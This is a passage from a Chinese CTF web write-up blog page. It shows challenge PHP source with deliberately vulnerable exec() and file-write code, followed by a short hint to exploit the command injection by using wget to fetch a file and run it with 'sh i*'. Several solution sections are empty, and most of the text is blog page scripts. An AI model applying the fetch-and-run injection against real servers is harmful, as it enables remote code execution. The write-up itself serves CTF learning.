+<h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h2><p>题目给了源码，在 <a href="http://47.104.166.183:20008/getflag.php" target="_blank" rel="external">http://47.104.166.183:20008/getflag.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">   <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_GET[<span class="string">'re'</span>])) &#123;</div><div class="line">	   show_source(<span class="keyword">__FILE__</span>);</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   $selfdir = $_GET[<span class="string">'dir'</span>];</div><div class="line">   <span class="keyword">if</span> (!<span class="keyword">isset</span>($selfdir)) &#123;</div><div class="line">	 <span class="keyword">die</span>();</div><div class="line">   &#125;</div><div class="line">   $secret = <span class="string">'/var/www/html/hackme/'</span> . md5(<span class="string">"cetcrce"</span> . $selfdir . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">   @chdir(<span class="string">'hackme'</span>);</div><div class="line">   @mkdir($secret);</div><div class="line">   @chdir($secret);</div><div class="line"></div><div class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]) &amp;&amp; strlen($_GET[<span class="string">'c'</span>]) &lt;= <span class="number">5</span>) &#123;</div><div class="line">	   <span class="keyword">include</span>(<span class="string">'waf.php'</span>);</div><div class="line">	   @exec($_GET[<span class="string">'c'</span>]);</div><div class="line">   &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($_GET[<span class="string">'re'</span>])) &#123;</div><div class="line">	   @exec(<span class="string">'/bin/rm -rf '</span> . $secret);</div><div class="line">	   @exec(<span class="string">'touch /var/www/html/hackme/index.php'</span>);</div><div class="line">   &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>相比于hitcon17的babyfirst，多了个waf.php，但不知道它的具体内容。<br>参考 <a href="https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/">HITCON CTF 2017-BabyFirst Revenge-writeup </a></p>
+<p>用wget获取文件index.html，执行<code>sh i*</code>即可执行<code>sh index.html</code>：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/11.jpg?raw=true" alt=""></p>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;J0w_ab0ut_c0mmAnd_3xcu&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="工控云管理系统项目管理页面解析漏洞"><a href="#工控云管理系统项目管理页面解析漏洞" class="headerlink" title="工控云管理系统项目管理页面解析漏洞"></a>工控云管理系统项目管理页面解析漏洞</h1><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这个工控云管理系统的解析漏洞要靠管理员去修补。</div><div class="line">http://47.104.156.32:20007</div></pre></td></tr></table></figure>
+<h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h2><p>点进去后，点击项目管理，发现url为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.156.32:20007/index.php?page=flag.php</div></pre></td></tr></table></figure></p>
+<p>同时有一个view-source按钮，给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</div><div class="line">   $con = $_POST[<span class="string">'con'</span>];</div><div class="line">   $file = $_POST[<span class="string">'file'</span>];</div><div class="line">   $filename = <span class="string">"backup/"</span>.$file;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">        chdir(<span class="string">'uploaded'</span>);</div><div class="line">       $f = fopen($filename, <span class="string">'w'</span>);</div><div class="line">       fwrite($f, $con);</div><div class="line">       fclose($f);</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">'config.php'</span>;</div><div class="line">    $id = mysql_real_escape_string($_GET[id]);</div><div class="line">    $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</div><div class="line">    $result = mysql_query($sql);</div><div class="line">    $result = mysql_fetch_object($result);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    $result = <span class="keyword">False</span>;</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</div><div class="line">  <span class="keyword">if</span>($result)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</div><div class="line">    $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</div><div class="line">  &#125;</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>接下来这段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</div><div class="line">   $con = $_POST[<span class="string">'con'</span>];</div><div class="line">   $file = $_POST[<span class="string">'file'</span>];</div><div class="line">   $filename = <span class="string">"backup/"</span>.$file;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">        chdir(<span class="string">'uploaded'</span>);</div><div class="line">       $f = fopen($filename, <span class="string">'w'</span>);</div><div class="line">       fwrite($f, $con);</div><div class="line">       fclose($f);</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>参考 <a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=626</a></p>
+<h1 id="云工控管理系统文档中心的秘密"><a href="#云工控管理系统文档中心的秘密" class="headerlink" title="云工控管理系统文档中心的秘密"></a>云工控管理系统文档中心的秘密</h1><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云工控管理系统的文档中心页面，存在不易被发现的漏洞。</div><div class="line">http://47.104.73.107:20002/</div></pre></td></tr></table></figure>
+<h2 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h2><h1 id="YUNWAF的突破-华为云"><a href="#YUNWAF的突破-华为云" class="headerlink" title="YUNWAF的突破_华为云"></a>YUN<em>WAF</em>的突破_华为云</h1><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">工控云管理系统新版本，有防护了。不知道防护有没有用。</div><div class="line">http://huaweicetc.xctf.org.cn</div></pre></td></tr></table></figure>
+<h2 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h2><h1 id="YUNWAF的突破-阿里"><a href="#YUNWAF的突破-阿里" class="headerlink" title="YUNWAF的突破_阿里"></a>YUN<em>WAF</em>的突破_阿里</h1><h2 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">工控云管理系统新版本，有防护了。不知道防护有没有用。</div><div class="line">http://alicetc.xctf.org.cn</div></pre></td></tr></table></figure>
+<h2 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h2>
+      
+    </div>
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/">赛博地球杯工业互联网安全大赛-Web-writeup</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2018年01月18日 - 11:01</p>
+  <p><span>最后更新:</span>2018年01月20日 - 11:01</p>
+  <p><span>原始链接:</span><a href="/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/" title="赛博地球杯工业互联网安全大赛-Web-writeup">http://chybeta.github.io/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+
+      
+	</div>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/wechat.jpg?raw=true" alt="chybeta WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/26/axublog-v1-0-6-两处sql注入分析/" rel="next" title="axublog v1.0.6 两处sql注入分析">
+                <i class="fa fa-chevron-left"></i> axublog v1.0.6 两处sql注入分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/3017/07/26/一些文章/" rel="prev" title="一些文章">
+                一些文章 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTAzNC81NjAz"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="chybeta" />
+          <p class="site-author-name" itemprop="name">chybeta</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">153</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">69</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/CHYbeta" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/chybeta" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ph0en1x.com/" title="XMU-Ph0en1x" target="_blank">XMU-Ph0en1x</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://lxpark.com/" title="lzhtony" target="_blank">lzhtony</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.cnblogs.com/findneo/" title="findneo" target="_blank">findneo</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.madsome.cn" title="Mads" target="_blank">Mads</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://philhe.coding.me/" title="Philhe" target="_blank">Philhe</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#大量设备报表不见了（签道题）"><span class="nav-number">1.</span> <span class="nav-text">大量设备报表不见了（签道题）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">1.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-number">1.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工控系统的敏感消息遭泄漏"><span class="nav-number">2.</span> <span class="nav-text">工控系统的敏感消息遭泄漏</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-1"><span class="nav-number">2.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-1"><span class="nav-number">2.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工控管理系统新版本"><span class="nav-number">3.</span> <span class="nav-text">工控管理系统新版本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-2"><span class="nav-number">3.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-2"><span class="nav-number">3.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工控云管理系统设备维护中心被植入后门"><span class="nav-number">4.</span> <span class="nav-text">工控云管理系统设备维护中心被植入后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-3"><span class="nav-number">4.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-3"><span class="nav-number">4.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工控云管理系统客服中心期待您的反馈"><span class="nav-number">5.</span> <span class="nav-text">工控云管理系统客服中心期待您的反馈</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-4"><span class="nav-number">5.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-4"><span class="nav-number">5.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#YUNWAF的突破-青云"><span class="nav-number">6.</span> <span class="nav-text">YUNWAF的突破_青云</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-5"><span class="nav-number">6.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-5"><span class="nav-number">6.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#请关注工控云管理系统的警告记录"><span class="nav-number">7.</span> <span class="nav-text">请关注工控云管理系统的警告记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-6"><span class="nav-number">7.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-6"><span class="nav-number">7.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工控云管理系统项目管理页面解析漏洞"><span class="nav-number">8.</span> <span class="nav-text">工控云管理系统项目管理页面解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-7"><span class="nav-number">8.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-7"><span class="nav-number">8.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#云工控管理系统文档中心的秘密"><span class="nav-number">9.</span> <span class="nav-text">云工控管理系统文档中心的秘密</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-8"><span class="nav-number">9.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-8"><span class="nav-number">9.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#YUNWAF的突破-华为云"><span class="nav-number">10.</span> <span class="nav-text">YUNWAF的突破_华为云</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-9"><span class="nav-number">10.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-9"><span class="nav-number">10.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#YUNWAF的突破-阿里"><span class="nav-number">11.</span> <span class="nav-text">YUNWAF的突破_阿里</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-10"><span class="nav-number">11.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-10"><span class="nav-number">11.2.</span> <span class="nav-text">Solution</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chybeta</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("unqDDYqYUADBUogKkMVqqvFH-gzGzoHsz", "afr1xO80LoKo0xCpxHJCleC4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
